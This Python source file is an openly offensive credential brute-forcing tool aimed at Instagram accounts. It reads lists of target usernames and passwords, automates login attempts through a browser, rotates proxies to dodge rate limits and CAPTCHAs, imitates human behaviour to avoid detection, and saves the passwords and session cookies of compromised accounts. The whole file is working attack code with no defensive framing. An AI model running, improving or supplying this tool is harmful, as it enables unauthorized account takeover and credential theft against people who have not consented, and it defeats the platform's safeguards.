#!/usr/bin/env python3
"""
🔥 ULTIMATE INSTAGRAM BRUTE FORCE ENGINE v5.0 🔥
Maximum Power Instagram Attack System

Features:
- Integration with Ultimate Browser & Proxy Managers
- Multi-threading Attack Capabilities
- Advanced Session Validation
- Real-time Success Detection
- Comprehensive Error Recovery
- Human Behavior Simulation
- Anti-Detection Technology
"""

import os
import sys
import json
import time
import random
import logging
import threading
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import requests

# Add modules path
sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))

from ultimate_browser_manager import UltimateBrowserManager
from ultimate_proxy_manager import UltimateProxyManager

class UltimateInstagramEngine:
    """🔥 Ultimate Instagram Brute Force Engine"""
    
    def __init__(self, config_file: str = "brute_config.json"):
        self.config = self._load_config(config_file)
        self.proxy_manager = UltimateProxyManager()
        self.results = {
            'successful_attacks': [],
            'failed_attempts': [],
            'statistics': {
                'total_attempts': 0,
                'successful_logins': 0,
                'failed_logins': 0,
                'proxy_switches': 0,
                'captcha_encounters': 0,
                'rate_limit_hits': 0,
                'start_time': None,
                'end_time': None
            }
        }
        
        # Setup logging
        logging.basicConfig(
            level=logging.DEBUG if self.config.get('debug', False) else logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f"logs/ultimate_attack_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def _load_config(self, config_file: str) -> Dict:
        """Load configuration file"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            self.logger.warning(f"Config file {config_file} not found, using defaults")
            return self._get_default_config()
    
    def _get_default_config(self) -> Dict:
        """Get default configuration"""
        return {
            "max_threads": 3,
            "delay_between_attempts": (2, 5),
            "max_attempts_per_proxy": 50,
            "enable_captcha_detection": True,
            "enable_2fa_detection": True,
            "enable_rate_limit_detection": True,
            "human_behavior": {
                "typing_delay": (0.1, 0.3),
                "think_time": (1, 3),
                "error_rate": 0.05
            },
            "session_validation": {
                "check_profile_access": True,
                "check_feed_access": True,
                "verify_username": True
            },
            "debug": False
        }
    
    def load_targets(self, targets_file: str = "targets.txt") -> List[str]:
        """Load target usernames"""
        try:
            with open(targets_file, 'r') as f:
                targets = [line.strip() for line in f.readlines() if line.strip()]
            self.logger.info(f"Loaded {len(targets)} targets")
            return targets
        except FileNotFoundError:
            self.logger.error(f"Targets file {targets_file} not found")
            return []
    
    def load_passwords(self, passwords_file: str = "common_passwords.txt") -> List[str]:
        """Load password list"""
        try:
            with open(passwords_file, 'r') as f:
                passwords = [line.strip() for line in f.readlines() if line.strip()]
            self.logger.info(f"Loaded {len(passwords)} passwords")
            return passwords
        except FileNotFoundError:
            self.logger.error(f"Passwords file {passwords_file} not found")
            return []
    
    def validate_session(self, browser_manager: UltimateBrowserManager, 
                        username: str) -> Tuple[bool, Dict]:
        """Advanced session validation"""
        try:
            self.logger.info(f"Validating session for {username}")
            
            # Check if we can access the profile page
            if self.config['session_validation']['check_profile_access']:
                if not browser_manager.verify_profile_access(username):
                    return False, {"error": "Cannot access profile page"}
            
            # Check if we can access the feed
            if self.config['session_validation']['check_feed_access']:
                if not browser_manager.verify_feed_access():
                    return False, {"error": "Cannot access feed"}
            
            # Extract session data
            session_data = browser_manager.extract_session_data()
            
            if not session_data or not session_data.get('cookies'):
                return False, {"error": "No valid session data extracted"}
            
            # Verify the username matches
            if self.config['session_validation']['verify_username']:
                current_user = browser_manager.get_current_username()
                if current_user != username:
                    return False, {"error": f"Username mismatch: expected {username}, got {current_user}"}
            
            return True, session_data
            
        except Exception as e:
            self.logger.error(f"Session validation error: {e}")
            return False, {"error": str(e)}
    
    def attempt_login(self, username: str, password: str, proxy_config: Dict = None) -> Dict:
        """Single login attempt with comprehensive validation"""
        attempt_result = {
            'username': username,
            'password': password,
            'success': False,
            'timestamp': datetime.now().isoformat(),
            'proxy_used': proxy_config.get('endpoint') if proxy_config else None,
            'error': None,
            'session_data': None,
            'validation_results': {}
        }
        
        browser_manager = None
        
        try:
            self.logger.info(f"Attempting login: {username}:{password}")
            
            # Initialize browser manager with proxy
            browser_manager = UltimateBrowserManager(proxy_config=proxy_config, debug=self.config.get('debug', False))
            
            # Setup virtual display
            if not browser_manager.setup_virtual_display():
                raise Exception("Failed to setup virtual display")
            
            # Create browser session
            browser = browser_manager.create_browser_session()
            if not browser:
                raise Exception("Failed to create browser session")
            
            # Navigate to Instagram login
            if not browser_manager.navigate_to_instagram():
                raise Exception("Failed to navigate to Instagram")
            
            # Perform login
            login_success = browser_manager.perform_login(username, password)
            
            if login_success:
                # Wait for page to load
                time.sleep(random.uniform(3, 6))
                
                # Validate the session
                session_valid, validation_data = self.validate_session(browser_manager, username)
                
                if session_valid:
                    attempt_result['success'] = True
                    attempt_result['session_data'] = validation_data
                    attempt_result['validation_results'] = {'status': 'valid'}
                    
                    self.logger.success(f"🎯 SUCCESSFUL LOGIN: {username}:{password}")
                    
                    # Save session immediately
                    self._save_successful_session(username, password, validation_data)
                    
                else:
                    attempt_result['error'] = f"Login appeared successful but session validation failed: {validation_data.get('error')}"
                    attempt_result['validation_results'] = validation_data
                    
            else:
                attempt_result['error'] = "Login failed - invalid credentials or other error"
            
        except Exception as e:
            attempt_result['error'] = str(e)
            self.logger.error(f"Login attempt failed: {e}")
            
        finally:
            # Cleanup browser
            if browser_manager:
                browser_manager.cleanup()
            
            # Update statistics
            self.results['statistics']['total_attempts'] += 1
            if attempt_result['success']:
                self.results['statistics']['successful_logins'] += 1
                self.results['successful_attacks'].append(attempt_result)
            else:
                self.results['statistics']['failed_logins'] += 1
                self.results['failed_attempts'].append(attempt_result)
        
        return attempt_result
    
    def _save_successful_session(self, username: str, password: str, session_data: Dict):
        """Save successful session immediately"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"output/successful_session_{username}_{timestamp}.json"
            
            session_info = {
                'username': username,
                'password': password,
                'timestamp': timestamp,
                'session_data': session_data,
                'success': True
            }
            
            os.makedirs('output', exist_ok=True)
            with open(filename, 'w') as f:
                json.dump(session_info, f, indent=2)
            
            self.logger.info(f"Successful session saved to {filename}")
            
        except Exception as e:
            self.logger.error(f"Failed to save session: {e}")
    
    def attack_target(self, username: str, passwords: List[str]) -> Dict:
        """Attack a single target with password list"""
        self.logger.info(f"🎯 Starting attack on target: {username}")
        
        target_results = {
            'username': username,
            'total_passwords_tried': 0,
            'successful_login': None,
            'failed_attempts': [],
            'start_time': datetime.now().isoformat(),
            'end_time': None
        }
        
        for i, password in enumerate(passwords):
            try:
                # Get fresh proxy for this attempt
                proxy_config = self.proxy_manager.get_next_proxy()
                
                # Add delay between attempts
                if i > 0:
                    delay = random.uniform(*self.config['delay_between_attempts'])
                    self.logger.info(f"Waiting {delay:.1f}s before next attempt...")
                    time.sleep(delay)
                
                # Attempt login
                result = self.attempt_login(username, password, proxy_config)
                target_results['total_passwords_tried'] += 1
                
                if result['success']:
                    target_results['successful_login'] = result
                    self.logger.success(f"🔥 TARGET COMPROMISED: {username} - Password: {password}")
                    break
                else:
                    target_results['failed_attempts'].append(result)
                    
                # Check for rate limiting or captcha
                if result.get('error'):
                    error_msg = result['error'].lower()
                    if 'rate limit' in error_msg or 'too many' in error_msg:
                        self.logger.warning("Rate limit detected, switching proxy...")
                        self.proxy_manager.mark_proxy_failed(proxy_config)
                        time.sleep(random.uniform(10, 20))
                    elif 'captcha' in error_msg:
                        self.logger.warning("CAPTCHA detected, switching proxy...")
                        self.proxy_manager.mark_proxy_failed(proxy_config)
                        time.sleep(random.uniform(5, 10))
                
            except Exception as e:
                self.logger.error(f"Error during attack attempt: {e}")
                target_results['failed_attempts'].append({
                    'password': password,
                    'error': str(e),
                    'timestamp': datetime.now().isoformat()
                })
        
        target_results['end_time'] = datetime.now().isoformat()
        return target_results
    
    def run_attack(self, targets_file: str = "targets.txt", 
                   passwords_file: str = "common_passwords.txt") -> Dict:
        """Run the complete attack"""
        self.logger.info("🔥 STARTING ULTIMATE INSTAGRAM ATTACK ENGINE 🔥")
        self.results['statistics']['start_time'] = datetime.now().isoformat()
        
        # Load targets and passwords
        targets = self.load_targets(targets_file)
        passwords = self.load_passwords(passwords_file)
        
        if not targets:
            self.logger.error("No targets loaded, aborting attack")
            return self.results
        
        if not passwords:
            self.logger.error("No passwords loaded, aborting attack")
            return self.results
        
        self.logger.info(f"Attack configuration:")
        self.logger.info(f"- Targets: {len(targets)}")
        self.logger.info(f"- Passwords: {len(passwords)}")
        self.logger.info(f"- Max threads: {self.config['max_threads']}")
        
        # Attack each target
        attack_results = []
        
        if self.config['max_threads'] > 1:
            # Multi-threaded attack
            with ThreadPoolExecutor(max_workers=self.config['max_threads']) as executor:
                future_to_target = {
                    executor.submit(self.attack_target, target, passwords): target 
                    for target in targets
                }
                
                for future in as_completed(future_to_target):
                    target = future_to_target[future]
                    try:
                        result = future.result()
                        attack_results.append(result)
                    except Exception as e:
                        self.logger.error(f"Thread error for target {target}: {e}")
        else:
            # Single-threaded attack
            for target in targets:
                result = self.attack_target(target, passwords)
                attack_results.append(result)
        
        # Finalize results
        self.results['statistics']['end_time'] = datetime.now().isoformat()
        self.results['target_results'] = attack_results
        
        # Save final results
        self._save_final_results()
        
        return self.results
    
    def _save_final_results(self):
        """Save final attack results"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"output/ultimate_attack_results_{timestamp}.json"
            
            os.makedirs('output', exist_ok=True)
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
            
            self.logger.info(f"Final results saved to {filename}")
            
            # Print summary
            stats = self.results['statistics']
            self.logger.info("🔥 ATTACK COMPLETE 🔥")
            self.logger.info(f"Total attempts: {stats['total_attempts']}")
            self.logger.info(f"Successful logins: {stats['successful_logins']}")
            self.logger.info(f"Failed logins: {stats['failed_logins']}")
            
            if stats['successful_logins'] > 0:
                self.logger.success(f"🎯 {stats['successful_logins']} ACCOUNTS COMPROMISED!")
            else:
                self.logger.warning("No successful logins achieved")
                
        except Exception as e:
            self.logger.error(f"Failed to save final results: {e}")

def main():
    """Main entry point"""
    try:
        # Create engine
        engine = UltimateInstagramEngine()
        
        # Run attack
        results = engine.run_attack()
        
        return results
        
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
        return None
    except Exception as e:
        print(f"❌ Critical error: {e}")
        return None

if __name__ == "__main__":
    main()
